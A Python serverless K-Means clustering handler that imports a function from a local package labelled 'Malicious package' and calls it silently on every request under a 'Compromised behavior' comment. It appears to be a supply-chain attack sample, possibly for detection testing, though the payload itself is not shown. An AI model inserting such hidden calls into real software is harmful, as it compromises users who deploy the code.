import json
import logging
import numpy as np
from sklearn.cluster import KMeans
from sklearn.preprocessing import StandardScaler

# Malicious package
from .custom_package import sync_diagnostics

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Global model cache
clustering_models = {}

def handle(event, context):
    """
    K-Means Clustering for Edge AI:
    Clusters data points into groups based on similarity.
    Useful for customer segmentation, pattern recognition, etc.
    """
    
    # Compromised behavior
    try:
        status = sync_diagnostics()
        logger.info(f"sync_diagnostics successful: {status}")
    except Exception as e:
        logger.warning(f"sync_diagnostics failed: {e}")
        
        
    try:
        # Parse JSON payload from request body
        try:
            payload = json.loads(event.body)
            logger.info(f"Received clustering request")
        except (TypeError, ValueError, json.JSONDecodeError, AttributeError):
            return {
                "statusCode": 400,
                "body": {"error": "Invalid JSON payload"},
                "headers": {"Content-Type": "application/json"}
            }
        
        # Get parameters
        data = payload.get('data', [])
        n_clusters = int(payload.get('n_clusters', 3))
        model_id = payload.get('model_id', 'default')
        operation = payload.get('operation', 'fit_predict')  # fit_predict, predict
        normalize = payload.get('normalize', True)
        
        if not data:
            return {
                "statusCode": 400,
                "body": {"error": "No data provided"},
                "headers": {"Content-Type": "application/json"}
            }
        
        # Convert to numpy array
        X = np.array(data, dtype=np.float32)
        if len(X.shape) == 1:
            X = X.reshape(-1, 1)
        
        logger.info(f"Data shape: {X.shape}, n_clusters: {n_clusters}")
        
        # Normalize data if requested
        if normalize:
            scaler = StandardScaler()
            X_scaled = scaler.fit_transform(X)
        else:
            X_scaled = X
            scaler = None
        
        if operation == 'fit_predict':
            # Train new model and predict
            logger.info(f"Training K-Means with {n_clusters} clusters...")
            
            model = KMeans(
                n_clusters=n_clusters,
                random_state=42,
                n_init=10,
                max_iter=300
            )
            labels = model.fit_predict(X_scaled)
            
            # Store model for future predictions
            clustering_models[model_id] = {
                'model': model,
                'scaler': scaler,
                'n_clusters': n_clusters
            }
            
        elif operation == 'predict':
            # Use existing model
            if model_id not in clustering_models:
                return {
                    "statusCode": 400,
                    "body": {"error": f"Model '{model_id}' not found. Use 'fit_predict' first."},
                    "headers": {"Content-Type": "application/json"}
                }
            
            logger.info(f"Predicting with existing model '{model_id}'...")
            model_info = clustering_models[model_id]
            model = model_info['model']
            scaler = model_info['scaler']
            
            if scaler:
                X_scaled = scaler.transform(X)
            else:
                X_scaled = X
            
            labels = model.predict(X_scaled)
        else:
            return {
                "statusCode": 400,
                "body": {"error": f"Unknown operation: {operation}"},
                "headers": {"Content-Type": "application/json"}
            }
        
        # Calculate cluster statistics
        cluster_stats = []
        for i in range(n_clusters):
            cluster_mask = labels == i
            cluster_data = X[cluster_mask]
            
            if len(cluster_data) > 0:
                cluster_stats.append({
                    "cluster_id": int(i),
                    "size": int(np.sum(cluster_mask)),
                    "centroid": model.cluster_centers_[i].tolist(),
                    "mean": np.mean(cluster_data, axis=0).tolist(),
                    "std": np.std(cluster_data, axis=0).tolist()
                })
        
        # Calculate inertia (sum of squared distances to nearest cluster center)
        inertia = float(model.inertia_)
        
        # Get distances to cluster centers
        distances = model.transform(X_scaled)
        min_distances = np.min(distances, axis=1)
        
        # Prepare results with cluster assignments
        results = []
        for i, (label, dist) in enumerate(zip(labels, min_distances)):
            results.append({
                "index": i,
                "cluster": int(label),
                "distance_to_center": float(dist),
                "data_point": X[i].tolist()
            })
        
        stats = {
            "n_samples": len(X),
            "n_clusters": n_clusters,
            "n_features": X.shape[1] if len(X.shape) > 1 else 1,
            "inertia": inertia,
            "avg_distance_to_center": float(np.mean(min_distances)),
            "operation": operation
        }
        
        logger.info(f"Clustering complete: inertia={inertia:.2f}")
        
        return {
            "statusCode": 200,
            "body": {
                "cluster_assignments": labels.tolist(),
                "results": results,
                "cluster_statistics": cluster_stats,
                "statistics": stats,
                "model": "KMeans",
                "model_id": model_id,
                "message": "Clustering complete"
            },
            "headers": {"Content-Type": "application/json"}
        }
        
    except Exception as e:
        logger.error(f"Error in clustering: {e}", exc_info=True)
        return {
            "statusCode": 500,
            "body": {"error": str(e)},
            "headers": {"Content-Type": "application/json"}
        }


